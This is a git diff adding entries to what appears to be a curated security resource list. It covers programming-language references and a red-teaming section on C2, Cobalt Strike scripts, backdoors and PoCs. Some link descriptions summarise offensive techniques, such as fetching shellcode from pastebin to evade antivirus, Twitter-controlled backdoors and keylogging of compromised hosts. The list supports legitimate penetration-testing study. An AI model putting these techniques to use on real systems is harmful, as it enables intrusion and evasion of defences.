+  * [Lua code: security overview and practical approaches to static analysis](http://spw17.langsec.org/papers/costin-lua-static-analysis.pdf)
+
+    * Abstract — Lua is an interpreted, cross-platform, embeddable, performant
+      and low-footprint language. Lua’s popularity is on the rise in the last
+      couple of years. Simple design and efficient usage of resources combined
+      with its performance make it attractive or production web applications
+      even to big organizations such as Wikipedia, CloudFlare and GitHub. In
+      addition to this, Lua is one of the preferred choices for programming
+      embedded and IoT devices. This context allows to assume a large and
+      growing Lua codebase yet to be assessed. This growing Lua codebase could
+      be potentially driving production servers and extremely large number of
+      devices, some perhaps with mission-critical function for example in
+      automotive or home-automation domains. However, there is a substantial and
+      obvious lack of static analysis tools and vulnerable code corpora for Lua
+      as compared to other increasingly popular languages, such as PHP, Python
+      and JavaScript. Even the state-of-the-art commercial tools that support
+      dozens of languages and technologies actually do not support Lua static
+      code analysis. In this paper we present the first public Static Analysis
+      for SecurityTesting (SAST) tool for Lua code that is currently focused on
+      web vulnerabilities. We show its potential with good and promising
+      preliminary results that we obtained on simple and intentionally
+      vulnerable Lua code samples that we synthesized for our experiments. We
+      also present and release our synthesized corpus of intentionally
+      vulnerable Lua code, as well as the testing setups used in our experiments
+      in form of virtual and completely reproducible environments. We hope our
+      work can spark additional and renewed interest in this apparently
+      overlooked area of language security and static analysis, as well as
+      motivate community’s contribution to these open-source projects. The tool,
+      the samples and the testing VM setups will be released and updated at
+      http://lua.re and http://lua.rocks
+
+* Tools
+
+  * [REPL.lua](https://github.com/hoelzro/lua-repl)
+    * A reusable Lua REPL written in Lua, and an alternative to /usr/bin/lua
+
+### .NET
+
+* [.NET serialiception](https://blog.scrt.ch/2016/05/12/net-serialiception/)
+* [.Net The Managed Heap and Garbage Collection in the CLR](https://www.microsoftpressstore.com/articles/article.aspx?p=2224054)
+
+### Powershell
+
+### Learn
+
+* [Learn Windows PowerShell in a Month of Lunches, Third Edition - Book](https://www.manning.com/books/learn-windows-powershell-in-a-month-of-lunches-third-edition)
+* [learning-powershell/ - github repo](https://github.com/PowerShell/PowerShell/tree/master/docs/learning-powershell)
+* [Getting Started with Microsoft PowerShell - MS Virtual Academy](https://mva.microsoft.com/en-us/training-courses/getting-started-with-microsoft-powershell-8276?l=r54IrOWy_2304984382)
+* [Weekend Scripter: The Best Ways to Learn PowerShell - technet](https://blogs.technet.microsoft.com/heyscriptingguy/2015/01/04/weekend-scripter-the-best-ways-to-learn-powershell/)
+* [Powershell Tutorial Online](http://powershelltutorial.net/)
+* [Dirty Powershell Webserver](http://obscuresecurity.blogspot.com/2014/05/dirty-powershell-webserver.html)
+* [Useful Powershell scripts](https://github.com/clymb3r/PowerShell)
+
+### Reference
+
+### Tools
+
+* [Pester](https://github.com/pester/Pester)
+
+  * Pester provides a framework for running unit tests to execute and validate
+    PowerShell commands from within PowerShell. Pester consists of a simple set
+    of functions that expose a testing domain-specific language (DSL) for
+    isolating, running, evaluating and reporting the results of PowerShell
+    commands.
+
+### Other
+
+```
+Try/Catch Exception in Powershell
+
+try {
+    #stuff
+} catch {
+    $ErrorMessage = $_.Exception.Message
+    $ErrorSource = $_.Exception.Source
+    $err = $ErrorSource + " reports: " + $ErrorMessage
+}
+```
+
+### PHP
+
+* [awesome-php](https://github.com/ziadoz/awesome-php)
+
+  * A curated list of amazingly awesome PHP libraries, resources and shiny
+    things.
+
+* Documentation \* [PHP Documentation](https://secure.php.net/docs.php)
+* Educational _
+  [PHP: a fractal of bad design](https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/)
+  _
+  [Reference — What does this symbol mean in PHP?](https://stackoverflow.com/questions/3737139/reference-what-does-this-symbol-mean-in-php)
+* Tools
+
+  * [Static analysis tools for PHP](https://github.com/exakat/php-static-analysis-tools)
+  * A reviewed list of useful PHP static analysis tools
+
+### Python
+
+* [Python 3.6.2 documentation](https://docs.python.org/3/)
+* [Python 2.7 documentation](https://docs.python.org/2.7/)
+* Learn
+
+  * [Learn Python the Hard Way](http://learnpythonthehardway.org/book/)
+  * [Python For Beginners]()
+    * Welcome! Are you completely new to programming? If not then we presume you
+      will be looking for information about why and how to get started with
+      Python. Fortunately an experienced programmer in any programming language
+      (whatever it may be) can pick up Python very quickly. It's also easy for
+      beginners to use and learn, so jump in!
+  * [Obfuscating python](https://reverseengineering.stackexchange.com/questions/1943/what-are-the-techniques-and-tools-to-obfuscate-python-programs)
+  * [Understanding Python Bytecode](http://security.coverity.com/blog/2014/Nov/understanding-python-bytecode.html)
+  * [Reverse debugging for Python](https://morepypy.blogspot.com/2016/07/reverse-debugging-for-python.html?m=1)
+  * [Python in a hacker's toolbox (PyConPl'15)](http://gynvael.coldwind.pl/?lang=en&id=572)
+  * [Diving deep into Python – the not-so-obvious language parts](http://sebastianraschka.com/Articles/2014_deep_python.html)
+  * [PEP: 551 Title: Security transparency in the Python runtime Version](https://github.com/python/peps/blob/cd795ec53c939e5b40808bb9d7a80c428c85dd52/pep-0551.rst)
+  * [Build an API under 30 lines of code with Python and Flask](https://impythonist.wordpress.com/2015/07/12/build-an-api-under-30-lines-of-code-with-python-and-flask/)
+  * [Diving deep into Python – the not-so-obvious language parts](http://sebastianraschka.com/Articles/2014_deep_python.html)
+  * [Virtualenv](https://virtualenv.pypa.io/en/latest/userguide/)
+    * [Python Static Analysis - Spencer J McIntyre - Derbycon7](https://www.youtube.com/watch?v=hWIiyOV4Wbk&index=45&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
+      * Python is a popular language and that is true as well within the
+        Security industry. This talk will outline how Python code can be
+        statically analyzed using publicly available tools such as bandit. It
+        will then take a more technical approach and outline how the abstract
+        syntax tree (AST) can be processed and searched based on behavior clues
+        to identify potential security issues. Many security tools search for
+        vulnerabilities by analyzing the contents of static strings and
+        examining their variable names. This alternative approach instead
+        demonstrates how the AST can be analyzed to identify pieces of sensitive
+        information such as encryption keys and passwords based on matching them
+        with usage patterns. This will be a technical talk focused on using
+        automated techniques to find security vulnerabilities in Python
+        projects. The audience will leave with an understanding of these
+        techniques and how they can be applied to the projects they are either
+        developing themselves or using in their daily routines. This talk will
+        end with a live demonstration of a forked version of the public Bandit
+        scanner where these techniques have been implemented.
+  * [Python Static Analysis Spencer J McIntyre - Derbycon7](https://www.youtube.com/watch?v=hWIiyOV4Wbk&index=45&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
+
+* Reference
+
+  * [The Hitchhiker’s Guide to Python!](http://docs.python-guide.org/en/latest/)
+
+* Libraries
+
+  * [Python Library for interacting with Serial Ports](http://pyserial.sourceforge.net/)
+  * [Hachoir](https://bitbucket.org/haypo/hachoir/wiki/Home)
+    * Hachoir is a Python library that allows to view and edit a binary stream
+      field by field
+  * [Equip: python bytecode instrumentation](https://github.com/neuroo/equip)
+    * equip is a small library that helps with Python bytecode instrumentation.
+      Its API is designed to be small and flexible to enable a wide range of
+      possible instrumentations. The instrumentation is designed around the
+      injection of bytecode inside the bytecode of the program to be
+      instrumented. However, the developer does not need to know anything about
+      the Python bytecode since the injected code is Python source.
+  * [Construct2](https://github.com/construct/construct)
+    * Construct is a powerful declarative parser (and builder) for binary data.
+      Instead of writing imperative code to parse a piece of data, you
+      declaratively define a data structure that describes your data. As this
+      data structure is not code, you can use it in one direction to parse data
+      into Pythonic objects, and in the other direction, convert ("build")
+      objects into binary data.
+  * [Impacket](https://github.com/CoreSecurity/impacket)
+    * Impacket is a collection of Python classes for working with network
+      protocols. Impacket is focused on providing low-level programmatic access
+      to the packets and for some protocols (for instance NMB, SMB1-3 and
+      MS-DCERPC) the protocol implementation itself. Packets can be constructed
+      from scratch, as well as parsed from raw data, and the object oriented API
+      makes it simple to work with deep hierarchies of protocols. The library
+      provides a set of tools as examples of what can be done within the context
+      of this library.
+  * [Trollius and asyncio](https://trollius.readthedocs.io/asyncio.html)
+
+### Ruby
+
+* [Ruby Homepage](https://www.ruby-lang.org/en/)
+* [Official Ruby Docs](https://ruby-doc.org/)
+* [Ruby Gems](https://rubygems.org/)
+
+### Learn
+
+* [Ruby - Tutorials Point](http://www.tutorialspoint.com/ruby/)
+* [Ruby in 20 Minutes](https://www.ruby-lang.org/en/documentation/quickstart/)
+* [rb2exe](https://github.com/loureirorg/rb2exe)
+
+  * Ruby to EXE - Turn ruby scripts into portable executable apps
+
+### Useful Libraries/programs/Frameworks
+
+* [Shellpaste](https://github.com/andrew-morris/shellpaste)
+
+  * Tiny snippet of code that pulls ASCII shellcode from pastebin and executes
+    it. The purpose of this is to have a minimal amount of benign code so AV
+    doesn't freak out, then it pulls down the evil stuff. People have been doing
+    this kind of stuff for years so I take no credit for the concept. That being
+    said, this code (or similar code) works surprisingly often during pentests
+    when conventional malware fails.
+
+* [Ruby on Rails](http://rubyonrails.org/)
+
+### SQL
+
+* [SafeSQL](https://github.com/stripe/safesql)
+
+  * SafeSQL is a static analysis tool for Go that protects against SQL
+    injections.
+
+### UEFI Programming
+
+* [Unified Extensible Firmware Interface Forum](http://www.uefi.org/)
+* [Unified Extensible Firmware Interface](https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface)
+
+### Learn
+
+* [Programming for EFI: Creating a "Hello, World" Program](http://www.rodsbooks.com/efi-programming/hello.html)
+* [UEFI Programming - First
+  Steps](http://x86asm.net/articles/uefi-programming-first-steps/
+* [Getting started with UEFI application development](https://lihashgnis.blogspot.com/2016/08/getting-started-with-uefi-application.html)
+* [Getting started with UEFI Development](https://lihashgnis.blogspot.com/2016/08/getting-started-with-uefi-application.html)
+
+### Reference
+
+* [UEFI - OSDev](http://wiki.osdev.org/UEFI)
+
+### Talks & Presentations
+
+* [Simple Made Easy](https://www.infoq.com/presentations/Simple-Made-Easy)
+
+  * Rich Hickey emphasizes simplicity’s virtues over easiness’, showing that
+    while many choose easiness they may end up with complexity, and the better
+    way is to choose easiness along the simplicity path.
+
+### Other
+
+* [A successful Git branching model](http://nvie.com/posts/a-successful-git-branching-model/)
+* [Mostly Adequate Guide](https://drboolean.gitbooks.io/mostly-adequate-guide/)
+
+  * This is a book on the functional paradigm in general. We'll use the world's
+    most popular functional programming language: JavaScript. Some may feel this
+    is a poor choice as it's against the grain of the current culture which, at
+    the moment, feels predominately imperative.
+
+* [Reflective DLL Injection](http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf)
+* [Porting Windows Dynamic Link Libraries to Linux](https://github.com/taviso/loadlibrary)
diff --git a/source/Red-Teaming.md b/source/Red-Teaming.md
new file mode 100644
index 0000000..a56b58e
--- /dev/null
+++ b/source/Red-Teaming.md
@@ -0,0 +1,703 @@
+# Red Teaming/Adversary Simulation/Explicitly Pen testing stuff
+
+#### ToC
+
+* [General](#general)
+* [Talks/Videos](#talks)
+* [Articles/Blogposts](#articles)
+* [Papers](#papers)
+* [Tools](#tools)
+* [HW](#hw)
+* [SW](#sw)
+* [Command and Control](#cnc)
+* [Domain Fronting](#front)
+* [Egress](#egress)
+* [Domain Reputation Checking](#check)
+
+### To-do
+
+* Sort articles better
+* [PenTesting-Scripts - killswitch-GUI](https://github.com/killswitch-GUI/PenTesting-Scripts)
+* [Software Distribution Malware Infection Vector](https://dl.packetstormsecurity.net/papers/general/Software.Distribution.Malware.Infection.Vector.pdf)
+* [File Server Triage on Red Team Engagements](http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/)
+
+### General
+
+* [Red Team - Wikipedia](https://en.m.wikipedia.org/wiki/Red_team)
+* [Common Ground Part 1: Red Team History & Overview](https://www.sixdub.net/?p=705)
+* [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
+  * Wiki to collect Red Team infrastructure hardening resources
+  * Accompanying Presentation:
+    [Doomsday Preppers: Fortifying Your Red Team Infrastructure](https://speakerdeck.com/rvrsh3ll/doomsday-preppers-fortifying-your-red-team-infrastructure)
+* [Target Analysis - Wikipedia](https://en.wikipedia.org/wiki/Target_analysis)
+* [Center of Gravity Analysis - Dale C. Eikmeier](http://www.au.af.mil/au/awc/awcgate/milreview/eikmeier.pdf)
+  * Center of Gravity: A system's source of power to act.
+* [A Tradecraft Primer: Structured Analytic Techniques for Improving Intelligence Analysis - USGov 2009](https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/books-and-monographs/Tradecraft%20Primer-apr09.pdf)
+* [Advanced Threat Tactics – Course and Notes - CobaltStrike](https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/)
+
+### Articles
+
+* [Fools of Golden Gate](https://blog.silentsignal.eu/2017/05/08/fools-of-golden-gate/)
+
+  * How major vulnerabilities/large amounts of publicly vulnerable systems can
+    exist without public recognition for long periods of time. (i.e. CVEs(10.0)
+    exist, but no mapping in nessus/metasploit/etc)
+
+* [Red Teaming and the Adversarial Mindset: Have a Plan, Backup Plan and Escape Plan - ITS](https://www.itstactical.com/digicom/security/red-teaming-and-the-adversarial-mindset-have-a-plan-backup-plan-and-escape-plan/)
+
+* [Raphael’s Magic Quadrant - Mudge](https://blog.cobaltstrike.com/2015/08/03/raphaels-magic-quadrant/)
+
+* [RAT - Repurposing Adversarial Tradecraft - killswitch_GUI](https://speakerdeck.com/killswitch_gui/rat-repurposing-adversarial-tradecraft)
+
+* [Penetration Testing considered Harmful Today](http://blog.thinkst.com/p/penetration-testing-considered-harmful.html)
+* [Planning a Red Team exercise](https://github.com/magoo/redteam-plan)
+
+* Educational (Specific Tactics/Techniques/Misc)
+
+  * [#OLEOutlook - bypass almost every Corporate security control with a point’n’click GUI](https://doublepulsar.com/oleoutlook-bypass-almost-every-corporate-security-control-with-a-point-n-click-gui-37f4cbc107d0)
+  * [Offensive Encrypted Data Storage](http://www.harmj0y.net/blog/redteaming/offensive-encrypted-data-storage/)
+  * [Offensive Encrypted Data Storage (DPAPI edition)](https://posts.specterops.io/offensive-encrypted-data-storage-dpapi-edition-adda90e212ab)
+  * [Goodbye OODA Loop](http://armedforcesjournal.com/goodbye-ooda-loop/)
+  * [Planning a Red Team exercise](https://github.com/magoo/redteam-plan)
+
+* Red Team Experiences
+
+  * [Passing the Torch: Old School Red Teaming, New School Tactics?](https://www.slideshare.net/harmj0y/derbycon-passing-the-torch)
+  * [Red Teaming Tips - Vincent Yiu](https://threatintel.eu/2017/06/03/red-teaming-tips-by-vincent-yiu/)
+  * [Red Team Tips as posted by @vysecurity on Twitter](https://github.com/vysec/RedTips)
+  * [Red Teams - Facebook Experiences Writeup - Ryan McGeehan](https://medium.com/starting-up-security/red-teams-6faa8d95f602)
+  * [Reflections from a Red Team Leader - Susan Craig](http://usacac.army.mil/CAC2/MilitaryReview/Archives/English/MilitaryReview_20070430_art011.pdf)
+  * [Red Teaming: Using Cutting-Edge Threat Simulation to Harden the Microsoft Enterprise Cloud](https://azure.microsoft.com/en-us/blog/red-teaming-using-cutting-edge-threat-simulation-to-harden-the-microsoft-enterprise-cloud/)
+  * [10 Red Teaming Lessons Learned over 20 Years](https://redteamjournal.com/2015/10/10-red-teaming-lessons-learned-over-20-years/)
+  * [Red team versus blue team: How to run an effective simulation - CSOonline](https://www.csoonline.com/article/2122440/disaster-recovery/emergency-preparedness-red-team-versus-blue-team-how-to-run-an-effective-simulation.html)
+  * [Red Teaming for Pacific Rim CCDC 2017](https://bluescreenofjeff.com/2017-05-02-red-teaming-for-pacific-rim-ccdc-2017/)
+  * [How I Prepared to Red Team at PRCCDC 2015](https://bluescreenofjeff.com/2015-04-15-how-i-prepared-to-red-team-at-prccdc-2015/)
+  * [Red Teaming for Pacific Rim CCDC 2016](https://bluescreenofjeff.com/2016-05-24-pacific-rim-ccdc_2016/)
+
+* Papers
+
+  * [Red teaming - A Short Introduction (1.0) June 2009 - Mark Mateski](<https://redteamjournal.com/papers/A%20Short%20Introduction%20to%20Red%20Teaming%20(1dot0).pdf>)
+  * [Red Teaming Guide - UK Ministry of Defense](https://www.gov.uk/government/uploads/system/uploads/attachment_data/file/142533/20130301_red_teaming_ed2.pdf)
+  * [Red Team Handbook(2012) - University of Foreign Military And Cultural studies](http://www.au.af.mil/au/awc/awcgate/army/ufmcs_red_team_handbook_apr2012.pdf)
+  * [Red Teaming of Advanced Information Assurance Concepts - Bradley Wood, Ruth Duggan](http://cs.uccs.edu/~gsc/pub/master/sjelinek/doc/research/red.pdf)
+  * [A Guide To Red Teaming - NATO](http://www.act.nato.int/images/stories/events/2011/cde/rr_ukdcdc.pdf)
+  * [Modeling and Simulation of Red Teaming - Part 1: Why Red Team M&S? - Michael J Skroch](https://redteamjournal.com/wp-content/uploads/2009/12/msrt0.3-2nov2009-sand2009-7215J.pdf)
+  * [Moving Forward with Computational Red Teaming - Scott Wheeler - Australian DoD](http://www.dtic.mil/dtic/tr/fulltext/u2/a569437.pdf)
+  * [Cyber Red Teaming Organisational, technical and legal implications in a military context - NATO](https://ccdcoe.org/sites/default/files/multimedia/pdf/Cyber_Red_Team.pdf)
+  * [Traditions In Military-Strategic Thought In Germany And The Problem Of Deterrence - 1989 - Detlef Bald](http://www.mgfa.de/html/einsatzunterstuetzung/downloads/ap018englisch.pdf?PHPSESSID=931748af0e86616800373655acaf2902)
+  * [Force Protection and Suicide Bombers: The Necessity for Two Types of Canadian Military Red Teams](http://www.journal.forces.gc.ca/vol12/no4/page35-eng.asp)
+  * [The Applied Critical Thinking Handbook(2015) - University of Foreign Military And Cultural studies](http://usacac.army.mil/sites/default/files/documents/ufmcs/The_Applied_Critical_Thinking_Handbook_v7.0.pdf)
+  * [Preparing for the War of the Future in the Wake of Defeat: The Evolution of German Strategic Thought, 1919 - 1935 - Mark Shannon](https://www.ciaonet.org/attachments/25573/uploads)
+  * [Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains](https://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf)
+  * [Ananalysis of the Metasploit Framework relative to the Penetration Testing Execution Standard(PTES) guidance(2011) - Brandon Perry](http://www.nothink.org/metasploit/documentation/metasploit_msf_analysis_ptes.pdf)
+
+### Talks/Videos
+
+* [Hacks Lies Nation States - Mario DiNatale](https://www.youtube.com/watch?v=nyh_ORq1Qwk)
+* [The Impact of Dark Knowledge and Secrets on Security and Intelligence Professionals - Richard Thieme](https://www.youtube.com/watch?v=0MzcPBAj88A&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe)
+
+  * Dismissing or laughing off concerns about what it does to a person to know
+    critical secrets does not lessen the impact on life, work, and relationships
+    of building a different map of reality than “normal people” use. One has to
+    calibrate narratives to what another believes. One has to live defensively,
+    warily. This causes at the least cognitive dissonance which some manage by
+    denial. But refusing to feel the pain does not make it go away. It just
+    intensifies the consequences when they erupt. Philip K. Dick said, reality
+    is that which, when you no longer believe in it, does not go away. When
+    cognitive dissonance evolves into symptoms of traumatic stress, one ignores
+    those symptoms at one’s peril. But the very constraints of one’s work often
+    make it impossible to speak aloud about those symptoms, because that might
+    threaten one’s clearances, work, and career. And whistle blower protection
+    is often non-existent.
+
+* Educational
+
+  * [Finding Diamonds in the Rough- Parsing for Pentesters](https://bluescreenofjeff.com/2016-07-26-finding-diamonds-in-the-rough-parsing-for-pentesters/)
+  * [Hillbilly Storytime - Pentest Fails - Adam Compton](https://www.youtube.com/watch?v=GSbKeTPv2TU)
+
+    * Whether or not you are just starting in InfoSec, it is always important to
+      remember that mistakes happen, even to the best and most seasoned of
+      analysts. The key is to learn from your mistakes and keep going. So, if
+      you have a few minutes and want to talk a load off for a bit, come and
+      join in as a hillbilly spins a yarn about a group unfortunate pentesters
+      and their misadventures. All stories and events are true (but the names
+      have been be changed to prevent embarrassment).
+
+  * [Building A Successful Internal Adversarial Simulation Team - C. Gates & C. Nickerson - BruCON 0x08](https://www.youtube.com/watch?v=Q5Fu6AvXi_A&list=PLtb1FJdVWjUfCe1Vcj67PG5Px8u1VY3YD&index=1)
+
+* Recon
+
+  * [Full Contact Recon int0x80 of Dual Core savant - Derbycon7](https://www.youtube.com/watch?v=XBqmvpzrNfs)
+
+* Tactics
+
+  * [Stupid RedTeamer Tricks - Laurent Desaulniers](https://www.youtube.com/watch?v=2g_8oHM0nwA&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=11)
+  * [Abusing Webhooks for Command and Control - Dimitry Snezhkov](https://www.youtube.com/watch?v=1d3QCA2cR8o&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=12)
+  * [Looping Surveillance Cameras through Live Editing - Van Albert and Banks - Defcon23](https://www.youtube.com/watch?v=RoOqznZUClI)
+
+    * This project consists of the hardware and software necessary to hijack
+      wired network communications. The hardware allows an attacker to splice
+      into live network cabling without ever breaking the physical connection.
+      This allows the traffic on the line to be passively tapped and examined.
+      Once the attacker has gained enough knowledge about the data being sent,
+      the device switches to an active tap topology, where data in both
+      directions can be modified on the fly. Through our custom implementation
+      of the network stack, we can accurately mimic the two devices across
+      almost all OSI layers. We have developed several applications for this
+      technology. Most notable is the editing of live video streams to produce a
+      “camera loop,” that is, hijacking the feed from an Ethernet surveillance
+      camera so that the same footage repeats over and over again. More advanced
+      video transformations can be applied if necessary. This attack can be
+      executed and activated with practically no interruption in service, and
+      when deactivated, is completely transparent.
+
+  * [Sniffing Sunlight - Erik Kamerling - ANYCON2017](http://www.irongeek.com/i.php?page=videos/anycon2017/102-sniffing-sunlight-erik-kamerling)
+
+    * Laser listening devices (laser microphones) are a well understood
+      technology. They have historically been used in the surreptitious
+      surveillance of protected spaces. Using such a device, an attacker bounces
+      an infrared laser off of a reflective surface, and receives the ricocheted
+      beam with a photoreceptor. If the beam is reflected from a surface that is
+      vibrating due to sound (voice is a typical background target), that sound
+      is subsequently modulated into the beam and can be demodulated at the
+      receptor. This is a known attack method and will be briefly discussed.
+      However, does this principle also hold for non-amplified or naturally
+      concentrated light sources? Can one retrieve modulated audio from
+      reflected sunlight? The idea of modulating voice with sunlight was
+      pioneered by Alexander Graham Bell in 1880 with an invention called the
+      Photophone. A Photophone uses the audio modulation concept now used in
+      laser microphones, but relied on a concentrated beam of sunlight rather
+      than a laser to communicate at distance. Considering that Bell proved that
+      intentionally concentrated sunlight can be used to modulate voice, we will
+      explore under what natural conditions modulated audio can be found in
+      reflected ambient light. Using off the shelf solar-cells and handmade
+      amplifiers, Erik will demonstrate the use of the receiver side of a
+      historic Photophone to identify instances of modulated audio in reflected
+      light under common conditions.
+
+  * [Red Teaming Back and Forth 5ever Fuzzynop - Derbycon4](https://www.youtube.com/watch?v=FTiBwFJQg64)
+  * [Advanced Red Teaming: All Your Badges Are Belong To Us - DEF CON 22 - Eric Smith and Josh Perrymon](https://www.youtube.com/watch?v=EEGxifOAk48)
+  * [Operating in the Shadows Carlos Perez - Derbycon5](https://www.youtube.com/watch?v=NXTr4bomAxk)
+  * [Building a Better Moat: Designing an Effective Covert Red Team Attack Infrastructure - @bluescreenofjeff](https://speakerdeck.com/bluscreenofjeff/building-a-better-moat-designing-an-effective-covert-red-team-attack-infrastructure)
+  * [88MPH Digital tricks to bypass Physical security - ZaCon4 - Andrew MacPherson](https://vimeo.com/52865794)
+  * [A Year In The Red by Dominic Chell and Vincent Yiu - BSides Manchester2017](https://www.youtube.com/watch?v=-FQgWGktYtw&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP&index=23)
+  * [Attacking EvilCorp: Anatomy of a Corporate Hack](http://www.irongeek.com/i.php?page=videos/derbycon6/111-attacking-evilcorp-anatomy-of-a-corporate-hack-sean-metcalf-will-schroeder)
+  * [Detect Me If You Can Ben Ten - Derbycon7](https://www.youtube.com/watch?v=AF3arWoKfKg&index=23&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
+  * [Modern Evasion Techniques Jason Lang - Derbycon7](https://www.irongeek.com/i.php?page=videos/derbycon7/t110-modern-evasion-techniques-jason-lang)
+
+    * As pentesters, we are often in need of working around security controls.
+      In this talk, we will reveal ways that we bypass in-line network defenses,
+      spam filters (in line and cloud based), as well as current endpoint
+      solutions. Some techniques are old, some are new, but all work in helping
+      to get a foothold established. Defenders: might want to come to this one.
+
+* Phishing
+
+  * [Hacking Corporate Em@il Systems - Nate Power](http://www.irongeek.com/i.php?page=videos/bsidescolumbus2016/offense04-hacking-corporate-emil-systems-nate-power)
+    * In this talk we will discuss current email system attack vectors and how
+      these systems can be abused and leveraged to break into corporate
+      networks. A penetration testing methodology will be discussed and
+      technical demonstrations of attacks will be shown. Phases of this
+      methodology include information gathering, network mapping, vulnerability
+      identification, penetration, privilege escalation, and maintaining access.
+      Methods for organizations to better protect systems will also be
+      discussed.
+
+### Slides
+
+* [Make It Count: Progressing through Pentesting - Bálint Varga-Perke -Silent Signal](https://silentsignal.hu/docs/Make_It_Count_-_Progressing_through_Pentesting_Balint_Varga-Perke_Silent_Signal.pdf)
+* [Pen Testing a City](https://www.blackhat.com/docs/us-15/materials/us-15-Conti-Pen-Testing-A-City-wp.pdf)
+* [Implanting a Dropcam](https://www.defcon.org/images/defcon-22/dc-22-presentations/Moore-Wardle/DEFCON-22-Colby-Moore-Patrick-Wardle-Synack-DropCam-Updated.pdf)
+
+### Cobalt Strike
+
+* Agressor Scripts
+
+  * [Aggressor Script - cs](https://www.cobaltstrike.com/aggressor-script/index.html)
+  * [CS Aggressor Scripts - ramen0x3f](https://github.com/ramen0x3f/AggressorScripts#utilscna)
+  * [aggressor_scripts_collection - invokethreatguy](https://github.com/invokethreatguy/aggressor_scripts_collection)
+    * Collection of various Aggressor Scripts for Cobalt Strike from awesome
+      people. Will be sure to update this repo with credit to each person.
+
+* C2
+
+  * [Cobalt Strike External C2 Paper](https://www.cobaltstrike.com/downloads/externalc2spec.pdf)
+  * [External C2 - cs](https://github.com/outflanknl/external_c2)
+    * POC for Cobalt Strike external C2
+  * [Cobalt Strike over external C2 – beacon home in the most obscure ways](https://outflank.nl/blog/2017/09/17/blogpost-cobalt-strike-over-external-c2-beacon-home-in-the-most-obscure-ways/)
+  * [OPSEC Considerations for Beacon Commands - CobaltStrike](https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/)
+  * [Valid SSL Certificates with SSL Beacon - cs](https://www.cobaltstrike.com/help-malleable-c2#validssl)
+  * [Randomized Malleable C2 Profiles Made Easy](https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/)
+  * [OPSEC Considerations for beacon commands](https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/)
+
+* Documentation
+
+  * [Malleable C2 Documenation - cs](https://www.cobaltstrike.com/help-malleable-c2)
+
+* Other
+
+  * [ANGRYPUPPY](https://github.com/vysec/ANGRYPUPPY)
+    * Bloodhound Attack Path Execution for Cobalt Strike
+  * [Modern Defense and You - CS](https://blog.cobaltstrike.com/2017/10/25/modern-defenses-and-you/)
+  * [User Driven Attacks - cs](https://blog.cobaltstrike.com/2014/10/01/user-driven-attacks/)
+    [DDEAutoCS](https://github.com/p292/DDEAutoCS)
+    * A cobaltstrike script that integrates DDEAuto Attacks (launches a staged
+      powershell CS beacon). This is not massively stealthy as far as CS scripts
+      go anything like that at the moment, more of a proof of concept, and for
+      having a play. Customise as you see fit to your needs.
+
+### Command & Control (CnC)
+
+* [Command & Control: Understanding, Denying and Detecting - 2014 - Joseph Gardiner, Marco Cova, Shishir Nagaraja](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)
+* Communication Channel Example PoCs
+* [Using WebSockets and IE/Edge for C2 communications](https://arno0x0x.wordpress.com/2017/11/10/https://github.com/leoloobeek/GoGreen/blob/master/README.mdusing-websockets-and-ie-edge-for-c2-communications/)
+* [Spidernet](https://github.com/wandering-nomad/Spidernet)
+
+  * Proof of Concept of SSH Botnet C&C Using Python
+
+  [twittor - twitter based backdoor](https://github.com/PaulSec/twittor)
+
+  * A stealthy Python based backdoor that uses Twitter (Direct Messages) as a
+    command and control server This project has been inspired by Gcat which does
+    the same but using a Gmail account.
+
+* [Instegogram](https://github.com/endgameinc/instegogram)
+
+* [WSC2](https://github.com/Arno0x/WSC2)
+
+  * WSC2 is a PoC of using the WebSockets and a browser process to serve as a C2
+    communication channel between an agent, running on the target system, and a
+    controller acting as the actuel C2 server.
+
+### PoCs
+
+* [RemoteRecon](https://github.com/xorrior/RemoteRecon)
+
+  * RemoteRecon provides the ability to execute post-exploitation capabilities
+    against a remote host, without having to expose your complete toolkit/agent.
+    Often times as operator's we need to compromise a host, just so we can
+    keylog or screenshot (or some other miniscule task) against a person/host of
+    interest. Why should you have to push over beacon, empire, innuendo,
+    meterpreter, or a custom RAT to the target? This increases the footprint
+    that you have in the target environment, exposes functionality in your
+    agent, and most likely your C2 infrastructure. An alternative would be to
+    deploy a secondary agent to targets of interest and collect intelligence.
+    Then store this data for retrieval at your discretion. If these compromised
+    endpoints are discovered by IR teams, you lose those endpoints and the
+    information you've collected, but nothing more.
+
+* [Expand Your Horizon Red Team – Modern SaaS C2](https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/)
+* [JSBN](https://github.com/Plazmaz/JSBN)
+
+  * JSBN is a bot client which interprets commands through Twitter, requiring no
+    hosting of servers or infected hosts from the command issuer. It is written
+    purely in javascript as a Proof-of-Concept for javascript's botnet
+    potentials.
+
+* [Command and Control Using Active Directory](http://www.harmj0y.net/blog/powershell/command-and-control-using-active-directory/)
+* [PoshC2 v3 with SOCKS Proxy (SharpSocks)](https://labs.nettitude.com/blog/poshc2-v3-with-socks-proxy-sharpsocks/)
+* [Abusing "Accepted Risk" With 3rd Party C2 - HackMiamiCon5](https://www.slideshare.net/sixdub/abusing-accepted-risk-with-3rd-party-c2-hackmiamicon5)
